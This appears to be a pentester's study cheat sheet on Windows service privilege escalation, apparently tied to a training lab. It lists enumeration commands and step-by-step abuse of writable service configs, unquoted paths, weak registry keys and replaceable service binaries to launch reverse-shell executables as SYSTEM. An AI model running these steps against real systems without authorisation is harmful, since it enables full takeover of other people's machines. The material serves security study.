# Service Exploits
-------

```cmd
sc.exe qc <name> REM query service configuration

sc.exe query <name> REM query current status

sc.exe config <name> <option>= <value> REM modify configuration option

net start/stop <name> REM start stop

accesschk.exe /accepteula -ucqv user regsvc REM check permissions for a service

accesscheck.exe /accepteula -uvw "C:\Program Files"
REM check permissions
```

Winpeas:
```cmd
.\winPEASany.exe quiet servicesinfo
```

Check the service status using:
```cmd
sc.exe query "C:\Program Files\Development Files\Devservice Files\Service.exe"
```

If we have shutdown privilege, restart the computer to restart the service
```cmd
shutdown.exe -r -f -t 1
```


---------------

## Insecure Service Permissions

If the user has permissions to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to a malicious one; granted we can start/stop the service or restart the machine.

Using winpeas to enumerate services information: 
```cmd
.\winPEASany.exe quiet serviceinfo
```

```cmd
daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped

YOU CAN MODIFY THIS SERVICE: ChangeConfig
```

Using access check to check permissions:
```cmd
.\accesschk.exe /accepteula -uwcqv user daclsvc
```

Query  service configuration:
```cmd
sc qc daclsvc
```

Query service status:
```cmd
sc query daclsvc
```

Set the binary path to the location of the payload:
```
sc config daclsvc binpath= "\"C:\Temp\reverse.exe""
```

Start the service:
```cmd
net start daclsvc
```

--------------

## Unquoted Service Paths

https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/
https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths

Checking for unquoted service paths:
```cmd
HKLM\SYSTEM\CurrentControlSet\Services\Servicename
```

```cmd
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Checking if we have write permissions over the directory using accesschk:

```cmd
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

Create an executable and place it in the folder; then restart the service.

-----------------

## Weak Registry Permissions

Lookout for **Modify any service registry** in winpeas

```
Check if you can modify the registry of a service

HKLM\system\currentcontrolset\services\regsvc (Interactive [FullControl])
```

Once found, we can edit registry entry for a service; we can use powershell or accesschk to verify permissions:

```bash
sc.exe qc regsvc
```

```cmd
reg query HKLM\system\currentcontrolset\services\regsvc
```


```cmd
reg add HKLM\system\currentcontrolset\services\regsvc /v imagePath /t REG_EXPAND_SZ /d C:\Users\user\Desktop\shell.exe /f
```

```cmd
net start regsvc
```

```Powershell
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

```cmd
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

- [ ] Check more on this!!!!!!!

-------------------

## Insecure Service Executables

If the original service exe is modifiable by our user, we can replace it w a malicious one to get back a reverse shell.

```cmd
filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"]

File Permissions: Everyone [AllAccess]
```

```cmd
icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
```

```cmd
copy shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

```
net start filepermsvc
```

-------------


## DLL Hijacking

If a DLL is loaded with an absolute path and is writable by our user, we can elevate privileges.

We can also abuse this if a DLL is missing from the system and our user has write access to the directory.
